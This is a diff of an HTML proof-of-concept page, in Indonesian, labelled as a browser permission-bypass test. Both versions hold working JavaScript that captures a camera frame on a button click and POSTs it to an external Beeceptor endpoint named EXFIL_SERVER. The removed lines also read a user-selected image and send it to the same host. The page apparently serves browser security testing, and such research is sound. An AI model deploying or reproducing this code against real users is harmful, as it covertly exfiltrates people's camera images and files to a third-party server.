@@ -2,70 +2,55 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Coba Keamanan Browser</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Permission Bypass Test</title>
 </head>
 <body>
-    <button id="trigger-btn" style="padding: 20px; font-size: 20px; cursor: pointer;">
-        Klik untuk Memulai Uji Coba
-    </button>
+    <h1>Security Diagnostic Test</h1>
+    <button id="start-test" style="padding: 20px; font-size: 18px;">Klik untuk Mulai Uji Coba</button>
 
     <script>
-        // URL Beeceptor Anda yang sudah diperbarui
+        // Endpoint tujuan Anda
         const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";
 
-        document.getElementById('trigger-btn').addEventListener('click', async () => {
-            console.log("Memulai proses...");
-
-            // 1. Uji File Picker (Akses Galeri)
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.onchange = (e) => {
-                const file = e.target.files[0];
-                const reader = new FileReader();
-                reader.onload = (ev) => {
-                    fetch(EXFIL_SERVER, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ 
-                            type: 'uploaded file', 
-                            fileName: file.name, 
-                            data: ev.target.result 
-                        }),
-                        keepalive: true
-                    });
-                };
-                reader.readAsDataURL(file);
-            };
-            input.click();
-
-            // 2. Uji Akses Kamera
+        document.getElementById('start-test').addEventListener('click', async () => {
             try {
+                // 1. Meminta izin dan akses kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.play();
                 
-                // Menunggu stream siap
-                setTimeout(() => {
+                // Menunggu video siap
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // 2. Mengambil gambar (snapshot)
                     const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // 3. Mengirim data ke Beeceptor
                     fetch(EXFIL_SERVER, {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ 
-                            type: 'camera_capture', 
-                            data: canvas.toDataURL('image/jpeg') 
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'camera_capture',
+                            fileName: 'capture_' + Date.now() + '.jpg',
+                            data: imageData
                         }),
                         keepalive: true
                     });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 1500);
-            } catch (err) { 
-                console.error("Akses kamera ditolak atau gagal:", err); 
+
+                    // 4. Menghentikan akses kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    alert("Foto berhasil diambil dan dikirim ke server!");
+                };
+            } catch (err) {
+                console.error("Gagal mendapatkan akses:", err);
+                alert("Akses ditolak atau terjadi kesalahan.");
             }
         });
     </script>
